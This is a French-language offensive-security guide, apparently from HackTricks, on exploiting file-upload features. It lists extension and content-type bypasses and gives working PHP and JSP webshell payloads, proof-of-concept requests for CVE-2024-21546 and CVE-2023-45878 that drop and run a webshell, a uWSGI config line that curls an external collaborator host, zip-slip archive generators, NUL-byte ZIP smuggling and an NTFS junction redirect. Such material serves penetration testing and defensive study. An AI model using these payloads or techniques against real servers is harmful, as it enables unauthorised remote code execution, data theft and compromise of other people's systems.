# Téléversement de fichiers

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie générale de téléversement de fichiers

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Contourner les vérifications d'extensions de fichiers

1. Si elles s'appliquent, vérifiez les **extensions précédentes**. Testez-les aussi en utilisant des **lettres majuscules** : _pHp, .pHP5, .PhAr ..._
2. _Vérifiez **l'ajout d'une extension valide avant** l'extension d'exécution (utilisez aussi les extensions précédentes) :_
- _file.png.php_
- _file.png.Php5_
3. Essayez d'ajouter des **caractères spéciaux à la fin.** Vous pouvez utiliser Burp pour **bruteforcer** tous les caractères **ASCII** et **Unicode**. (_Notez que vous pouvez aussi essayer d'utiliser les **extensions** mentionnées **précédemment**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Essayez de contourner les protections en **trompant le parser d'extensions** côté serveur avec des techniques comme le **doublement** de l'**extension** ou l'**ajout de données junk** (octets **null**) entre les extensions. _Vous pouvez aussi utiliser les **extensions précédentes** pour préparer un meilleur payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Ajoutez **une autre couche d'extensions** au test précédent :
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Essayez de mettre l'**extension exécutable avant l'extension valide** et priez pour que le serveur soit mal configuré. (utile pour exploiter des mauvaises configurations d'Apache où tout fichier dont l'extension est **.php**, mais qui ne se termine pas nécessairement par .php, exécutera du code) :
- _ex: file.php.png_
7. Utilisation des **NTFS alternate data stream (ADS)** sous **Windows**. Dans ce cas, un caractère deux-points ":" sera inséré après une extension interdite et avant une autorisée. En conséquence, un **fichier vide avec l'extension interdite** sera créé sur le serveur (e.g. "file.asax:.jpg”). Ce fichier pourrait être édité plus tard en utilisant d'autres techniques telles que son short filename. Le motif "**::$data**” peut aussi être utilisé pour créer des fichiers non vides. Par conséquent, ajouter un point après ce motif peut aussi être utile pour contourner d'autres restrictions (e.g. "file.asp::$data.”)
8. Essayez de dépasser les limites du nom de fichier. L'extension valide est tronquée. Et le PHP malveillant reste. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Certains gestionnaires d'upload suppriment ou normalisent les caractères point finaux du nom de fichier enregistré. Dans UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions antérieures à 2.9.1, vous pouvez contourner la validation d'extension en :

- Utiliser un MIME d'image valide et l'entête magic correspondant (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Nommer le fichier uploadé avec une extension PHP suivie d'un point, e.g., `shell.php.`.
- Le serveur supprime le point final et conserve `shell.php`, qui s'exécutera s'il est placé dans un répertoire servi par le web (stockage public par défaut comme `/storage/files/`).

PoC minimal (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Ensuite, accédez au chemin enregistré (typique de Laravel + LFM) :
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like **PHP-GD**, the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Trouver une vulnérabilité permettant de **renommer** le fichier déjà uploadé (pour changer l'extension).
- Trouver une vulnérabilité de **Local File Inclusion** pour exécuter le backdoor.
- **Divulgation d'information possible** :
1. Upload **plusieurs fois** (et en **même temps**) le **même fichier** avec le **même nom**
2. Uploader un fichier dont le **nom** est celui d'un **fichier** ou d'un **dossier** qui **existe déjà**
3. Uploader un fichier nommé **"." , "..", ou "…"**. Par exemple, sur Apache sous **Windows**, si l'application sauve les fichiers uploadés dans le répertoire "/www/uploads/", le nom de fichier "." créera un fichier appelé "uploads” dans le répertoire "/www/".
4. Uploader un fichier qui peut être difficile à supprimer comme **"…:.jpg"** sur **NTFS**. (Windows)
5. Uploader un fichier sous **Windows** avec des **caractères invalides** tels que `|<>*?”` dans son nom. (Windows)
6. Uploader un fichier sous **Windows** en utilisant des noms **réservés** (**interdits**) tels que CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, et LPT9.
- Essayez aussi d'**uploader un exécutable** (.exe) ou un **.html** (moins suspect) qui **exécutera du code** lorsqu'il est ouvert accidentellement par la victime.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'exécution du payload se produit lors de l'analyse du fichier de configuration. Pour que la configuration soit activée et analysée, le processus uWSGI doit soit être redémarré (potentiellement après un crash ou à la suite d'une attaque de Denial of Service), soit le fichier doit être configuré en rechargement automatique. La fonctionnalité de rechargement automatique, si elle est activée, recharge le fichier à intervalles spécifiés lorsqu'elle détecte des changements.

Il est crucial de comprendre le caractère permissif de l'analyse des fichiers de configuration d'uWSGI. Plus précisément, le payload discuté peut être inséré dans un fichier binaire (par exemple une image ou un PDF), élargissant ainsi le champ d'exploitation potentiel.

### Gibbon LMS : écriture arbitraire de fichier menant à RCE pré-auth (CVE-2023-45878)

Un endpoint non authentifié dans Gibbon LMS permet l'écriture arbitraire de fichiers dans le web root, conduisant à une RCE pré-auth en déposant un fichier PHP. Versions vulnérables : jusqu'à et incluant la 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Méthode: POST
- Paramètres requis :
- `img`: chaîne de type data-URI : `[mime];[name],[base64]` (le serveur ignore type/nom, décode en base64 la partie finale)
- `path`: nom de fichier de destination relatif au répertoire d'installation de Gibbon (par ex., `poc.php` ou `0xdf.php`)
- `gibbonPersonID`: n'importe quelle valeur non vide est acceptée (par ex., `0000000001`)

PoC minimal pour écrire et relire un fichier:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Déposer un webshell minimal et exécuter des commandes :
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- Le handler effectue `base64_decode($_POST["img"])` après avoir split par `;` et `,`, puis écrit les octets dans `$absolutePath . '/' . $_POST['path']` sans valider l'extension/type.
- Le code résultant s'exécute en tant qu'utilisateur du service web (p.ex., XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

Dans certains cas, vous pouvez constater qu'un serveur utilise **`wget`** pour **download files** et que vous pouvez **indicate** l'**URL**. Dans ces situations, le code peut vérifier que l'extension des fichiers téléchargés figure dans une whitelist afin de s'assurer que seuls des fichiers autorisés seront téléchargés. Cependant, **this check can be bypassed.**\
La **longueur maximale** d'un **nom de fichier** en **linux** est **255**, cependant **wget** tronque les noms de fichiers à **236** caractères. Vous pouvez **download a file called "A"*232+".php"+".gif"**, ce nom de fichier **bypass** la **check** (comme dans cet exemple **".gif"** est une extension **valid**) mais `wget` va **rename** le fichier en **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Notez que **une autre option** à laquelle vous pourriez penser pour contourner cette vérification est de faire en sorte que le **serveur HTTP redirige vers un fichier différent**, de sorte que l'URL initiale passera la vérification puis wget téléchargera le fichier redirigé avec le nouveau nom. Cela **ne fonctionnera pas** **sauf si** wget est utilisé avec le **paramètre** `--trust-server-names` parce que **wget téléchargera la page redirigée avec le nom du fichier indiqué dans l'URL originale**.

### Échapper au répertoire d'upload via NTFS junctions (Windows)

(Pour cette attaque, vous aurez besoin d'un accès local à la machine Windows) Lorsque les uploads sont stockés dans des sous-dossiers par utilisateur sur Windows (e.g., C:\Windows\Tasks\Uploads\<id>\) et que vous contrôlez la création/suppression de ce sous-dossier, vous pouvez le remplacer par une directory junction pointant vers un emplacement sensible (e.g., le webroot). Les uploads suivants seront écrits dans le chemin cible, permettant l'exécution de code si la cible interprète du code côté serveur.

Exemple de flux pour rediriger les uploads dans le webroot XAMPP:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J crée une jonction de répertoire NTFS (reparse point). Le compte du serveur web doit suivre la jonction et avoir l'autorisation d'écriture dans la destination.
- Cela redirige des écritures de fichiers arbitraires ; si la destination exécute des scripts (PHP/ASP), cela devient RCE.
- Défenses : ne permettez pas que les racines d'upload accessibles en écriture soient contrôlables par un attaquant sous C:\Windows\Tasks ou équivalent ; bloquez la création de jonctions ; validez les extensions côté serveur ; stockez les uploads sur un volume séparé ou avec des ACLs deny‑execute.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Certains handlers d'upload/ingestion écrivent le corps brut de la requête dans un chemin du système de fichiers construit à partir de paramètres de requête contrôlés par l'utilisateur. Si le handler supporte aussi Content-Encoding: gzip et n'arrive pas à canonicaliser/valider le chemin de destination, vous pouvez combiner path traversal avec une gzipped payload pour écrire des octets arbitraires dans un répertoire servi par le web et obtenir RCE (par ex., déposer un JSP dans webapps de Tomcat).

Generic exploitation flow:
- Préparez votre payload côté serveur (p.ex., JSP webshell minimal) et compressez les octets avec gzip.
- Envoyez un POST où un paramètre de chemin (p.ex., token) contient du path traversal permettant d'échapper le dossier prévu, et file indique le nom de fichier à persister. Mettez Content-Type: application/octet-stream et Content-Encoding: gzip ; le corps est le payload compressé.
- Accédez au fichier écrit pour déclencher l'exécution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Ensuite, déclenchez :
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Remarques
- Les chemins cibles varient selon l'installation (par ex., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ dans certaines stacks). Tout dossier exposé sur le web qui exécute JSP fonctionnera.
- L'extension Hackvertor de Burp Suite peut produire un corps gzip correct à partir de votre payload.
- Ceci est un pattern pur pre-auth arbitrary file write → RCE ; il ne repose pas sur le parsing multipart.

Atténuations
- Déterminez les destinations d'upload côté serveur ; ne faites jamais confiance aux fragments de chemin provenant des clients.
- Canonicalisez et imposez que le chemin résolu reste dans un répertoire de base allow-listé.
- Stockez les uploads sur un volume non exécutable et interdisez l'exécution de scripts depuis des chemins inscriptibles.

## Outils

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) est un outil puissant conçu pour aider les Pentesters et Bug Hunters à tester les mécanismes d'upload de fichiers. Il exploite diverses techniques de bug bounty pour simplifier le processus d'identification et d'exploitation des vulnérabilités, garantissant des évaluations approfondies des applications web.

### Corrupting upload indices with snprintf quirks (historical)

Certains gestionnaires d'upload hérités qui utilisent `snprintf()` ou un équivalent pour construire des tableaux multi-file à partir d'un upload single-file peuvent être trompés pour forger la structure `_FILES`. En raison d'incohérences et de troncature dans le comportement de `snprintf()`, un upload unique soigneusement conçu peut apparaître comme plusieurs fichiers indexés côté serveur, perturbant la logique qui suppose une forme stricte (par ex., en le traitant comme un multi-file upload et en prenant des branches non sécurisées). Bien que de niche aujourd'hui, ce pattern “index corruption” réapparaît parfois dans des CTFs et des bases de code plus anciennes.

## De l'upload de fichiers vers d'autres vulnérabilités

- Définissez **filename** sur `../../../tmp/lol.png` et essayez d'obtenir un **path traversal**
- Définissez **filename** sur `sleep(10)-- -.jpg` et vous pourrez peut-être obtenir une **SQL injection**
- Définissez **filename** sur `<svg onload=alert(document.domain)>` pour obtenir un XSS
- Définissez **filename** sur `; sleep 10;` pour tester du command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Téléversez le contenu \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) pour vérifier si le serveur a un **antivirus**
- Vérifiez s'il existe une **limite de taille** lors de l'upload de fichiers

Voici un top 10 des choses que vous pouvez réaliser via l'upload (d'après [ici](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Octets magiques d'en-tête

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Reportez-vous à [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) pour d'autres types de fichiers.

## Upload de fichiers Zip/Tar décompressés automatiquement

Si vous pouvez uploader un ZIP qui va être décompressé à l'intérieur du serveur, vous pouvez faire 2 choses:

### Symlink

Uploadez une archive contenant des symlinks (soft links) vers d'autres fichiers ; en accédant aux fichiers décompressés vous accéderez aux fichiers pointés :
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Décompresser dans différents répertoires

La création inattendue de fichiers dans des répertoires lors de la décompression est un problème important. Malgré les hypothèses initiales selon lesquelles cette configuration pourrait empêcher les OS-level command execution via des malicious file uploads, le support de la compression hiérarchique et les directory traversal capabilities du format d'archive ZIP peuvent être exploités. Cela permet aux attaquants de contourner les restrictions et d'échapper aux secure upload directories en manipulant la fonctionnalité de décompression de l'application ciblée.

Un exploit automatisé permettant de créer de tels fichiers est disponible sur [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilitaire peut être utilisé comme suit :
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
De plus, la **symlink trick with evilarc** est une option. Si l'objectif est de cibler un fichier comme `/flag.txt`, un symlink vers ce fichier doit être créé sur votre système. Cela garantit qu'evilarc ne rencontrera pas d'erreurs lors de son exécution.

Ci-dessous un exemple de code Python utilisé pour créer un fichier zip malveillant :
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Pour plus de détails **consultez l'article original sur** : [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Du code PHP est écrit pour exécuter des commandes transmises via la variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Plusieurs fichiers sont créés et une archive zip est assemblée contenant ces fichiers.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Les noms des fichiers à l'intérieur du zip sont modifiés avec vi ou un éditeur hexadécimal, en remplaçant "xxA" par "../" pour traverser les répertoires.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Quand un backend valide les entrées ZIP en utilisant ZipArchive de PHP mais que l'extraction écrit sur le système de fichiers en utilisant les noms bruts, vous pouvez dissimuler une extension interdite en insérant un NUL (0x00) dans les champs de nom de fichier. ZipArchive traite le nom de l'entrée comme une C‑string et le tronque au premier NUL ; le système de fichiers écrit le nom complet, supprimant tout ce qui suit le NUL.

Flux général :
- Préparer un fichier conteneur légitime (par ex. un PDF valide) qui intègre un petit stub PHP dans un flux afin que le magic/MIME reste un PDF.
- Nommez-le par exemple `shell.php..pdf`, compressez-le en zip, puis éditez en hexadécimal l'en-tête local du ZIP et le nom dans le central directory pour remplacer le premier `.` après `.php` par `0x00`, résultant en `shell.php\x00.pdf`.
- Les validateurs qui s'appuient sur ZipArchive « voient » `shell.php .pdf` et l'autorisent ; l'extracteur écrit `shell.php` sur le disque, conduisant à une RCE si le dossier d'upload est exécutable.

Étapes minimales du PoC :
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Remarques
- Change BOTH filename occurrences (local and central directory). Certains outils ajoutent aussi une entrée data descriptor supplémentaire – ajustez tous les champs de nom si présents.
- Le payload file doit toujours passer le server‑side magic/MIME sniffing. L'intégration du PHP dans un PDF stream maintient l'en‑tête valide.
- Fonctionne lorsque le enum/validation path et le extraction/write path divergent sur le traitement des chaînes.

### Stacked/concatenated ZIPs (parser disagreement)

La concaténation de deux fichiers ZIP valides produit un blob où différents parsers se focalisent sur différents enregistrements EOCD. De nombreux outils localisent le dernier End Of Central Directory (EOCD), tandis que certaines bibliothèques (par ex., ZipArchive dans certains workflows) peuvent parser la première archive qu'elles trouvent. Si la validation énumère la première archive et que l'extraction utilise un autre outil qui respecte le dernier EOCD, une archive bénigne peut passer les contrôles tandis qu'une archive malveillante est extraite.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Schéma d'abus
- Créez une archive bénigne (type autorisé, p.ex. un PDF) et une seconde archive contenant une extension bloquée (p.ex. `shell.php`).
- Concaténez-les : `cat benign.zip evil.zip > combined.zip`.
- Si le serveur valide avec un parseur (voit benign.zip) mais extrait avec un autre (traite evil.zip), le fichier bloqué se retrouve dans le chemin d'extraction.

## ImageTragic

